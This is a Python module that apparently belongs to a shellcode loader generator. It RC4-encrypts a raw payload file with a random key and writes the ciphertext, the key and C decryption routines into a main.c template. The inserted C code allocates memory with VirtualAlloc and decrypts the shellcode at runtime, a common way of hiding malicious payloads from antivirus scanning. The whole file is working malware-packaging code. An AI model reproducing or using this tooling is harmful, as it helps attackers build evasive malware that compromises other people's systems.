import os
import sys
import random

def desc():
    return "RC4 Encryption"

def getPayload():
    filename = './payload.bin'
    try:
        with open(filename, 'rb') as file:
            # Read the entire file
            file_content = file.read()
            return file_content
    except IOError as e:
        print("[!] I/O error({0}): {1}".format(e.errno, e.strerror))
        raise
    
def get_hex_string(data):
    result = ''

    for i in range(0, len(data), 16):
        result += "\t"
        chunk = data[i:i+16]
        for byte in chunk:
            result += f"0x{byte:02x}, "
        result += "\n"

    return result[1:-3]

def rc4(key, message):
    # Key-Scheduling Algorithm (KSA)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    # Pseudo-Random Generation Algorithm (PRGA)
    i = j = 0
    result = bytearray()
    for char in message:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(char ^ S[(S[i] + S[j]) % 256])
    
    return result

def fill_template(encrypted, key):
    functions = '''\
typedef struct {
	unsigned int i;
	unsigned int j;
	unsigned char s[256];
} Rc4Context;

void rc4Init(Rc4Context* context, const unsigned char* key, size_t length) {
	unsigned int i;
	unsigned int j;
	unsigned char temp;

	// Check parameters
	if (context == NULL || key == NULL)
		return ERROR_INVALID_PARAMETER;

	// Clear context
	context->i = 0;
	context->j = 0;

	// Initialize the S array with identity permutation
	for (i = 0; i < 256; i++)
	{
		context->s[i] = i;
	}

	// S is then processed for 256 iterations
	for (i = 0, j = 0; i < 256; i++)
	{
		//Randomize the permutations using the supplied key
		j = (j + context->s[i] + key[i % length]) % 256;

		//Swap the values of S[i] and S[j]
		temp = context->s[i];
		context->s[i] = context->s[j];
		context->s[j] = temp;
	}

}


void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length) {
	unsigned char temp;

	// Restore context
	unsigned int i = context->i;
	unsigned int j = context->j;
	unsigned char* s = context->s;

	// Encryption loop
	while (length > 0)
	{
		// Adjust indices
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		// Swap the values of S[i] and S[j]
		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		// Valid input and output?
		if (input != NULL && output != NULL)
		{
			//XOR the input data with the RC4 stream
			*output = *input ^ s[(s[i] + s[j]) % 256];

			//Increment data pointers
			input++;
			output++;
		}

		// Remaining bytes to process
		length--;
	}

	// Save context
	context->i = i;
	context->j = j;
}
'''

    functions += "\nunsigned char pKey[] = {" + key + "};"

    payload_mods = '''\
    SIZE_T      	sPayloadSize	= sizeof(pPayload);

    // Allocating buffer to hold decrypted shellcode
    PBYTE pShellcode = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy encrypted shellcode to decrypted shellcode buffer
    if (pShellcode)
        memcpy(pShellcode, pPayload, sPayloadSize);

	// Initialization
	Rc4Context ctx = { 0 };

	// Key used to decrypt
	rc4Init(&ctx, pKey, strlen(pKey));

	// Decryption
	rc4Cipher(&ctx, pPayload, pShellcode, sPayloadSize);
'''

    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("{{PAYLOAD}}", encrypted) \
                              .replace("{{PAYLOAD_MODS}}", payload_mods)

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)

def run():
    original_data = getPayload()

    # Generate random key (size 16)
    key = bytearray(random.randint(0, 255) for _ in range(16))
    key_str = ", ".join([f"0x{byte:02x}" for byte in key])

    # Encrypt data
    encrypted_data = rc4(key, bytearray(original_data))
    encrypted_str = get_hex_string(encrypted_data)

    # Fill template
    fill_template(encrypted_str, key_str)

    return